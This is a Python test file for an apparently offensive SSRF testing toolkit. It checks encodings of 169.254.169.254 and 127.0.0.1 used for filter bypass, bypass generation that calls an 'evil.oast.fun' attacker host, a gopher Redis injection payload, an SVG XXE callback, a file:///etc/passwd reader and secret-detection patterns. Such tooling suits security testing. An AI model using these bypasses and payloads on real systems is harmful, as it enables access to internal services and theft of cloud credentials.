"""
Tests for SSRF pure-logic: IP-encoding bypasses, payload generators, secret scan.
"""

import re

from modules.ssrf.bypass import generate_bypasses, ip_encodings
from modules.ssrf.payloads import (
    CLOUD_METADATA,
    SECRET_PATTERNS,
    SSRF_PARAM_NAMES,
    file_read,
    gopher_redis_set,
    svg_xxe,
)


# --- IP-encoding bypasses --------------------------------------------------
def test_ip_encodings_of_metadata_ip():
    enc = dict(ip_encodings("169.254.169.254"))
    assert enc["decimal"] == "2852039166"
    assert enc["hex"] == "0xa9fea9fe"
    assert enc["octal"] == "0251.0376.0251.0376"
    assert enc["ipv6-mapped"] == "[::ffff:169.254.169.254]"


def test_localhost_short_forms():
    enc = dict(ip_encodings("127.0.0.1"))
    assert enc["short-127.1"] == "127.1"
    assert enc["zero"] == "0.0.0.0"


def test_generate_bypasses_covers_families():
    cands = generate_bypasses("169.254.169.254", allowed_host="trusted.com",
                              attacker_host="evil.oast.fun")
    families = {c.family for c in cands}
    assert {"ip-encoding", "parser-confusion", "allowlist-evasion"} <= families
    # parser confusion includes the @ userinfo trick
    assert any("@" in c.payload for c in cands)


# --- payload generators ----------------------------------------------------
def test_gopher_redis_payload():
    p = gopher_redis_set("127.0.0.1", 6379, "k", "v")
    assert p.startswith("gopher://127.0.0.1:6379/_")
    assert "%0d%0a" in p  # CRLF-encoded


def test_svg_xxe_embeds_callback():
    svg = svg_xxe("http://cb.oast.fun/tok").decode()
    assert "cb.oast.fun/tok" in svg
    assert "<svg" in svg


def test_file_read_scheme():
    assert file_read("/etc/passwd") == "file:///etc/passwd"


# --- secret scanning (heapdump etc.) --------------------------------------
def test_secret_patterns_detect_aws_key():
    blob = "noise AKIAABCDEFGHIJKLMNOP more jdbc:mysql://db/app password=hunter2"
    hits = [label for pat, label in SECRET_PATTERNS if re.search(pat, blob)]
    assert "AWS access key id" in hits
    assert "JDBC connection string" in hits
    assert "password" in hits


# --- catalog sanity --------------------------------------------------------
def test_hunt_list_and_cloud_matrix():
    assert "url" in SSRF_PARAM_NAMES and "webhook" in SSRF_PARAM_NAMES
    providers = {e["provider"] for e in CLOUD_METADATA}
    assert any("AWS" in p for p in providers)
    assert any("GCP" in p for p in providers)
    assert any("Azure" in p for p in providers)
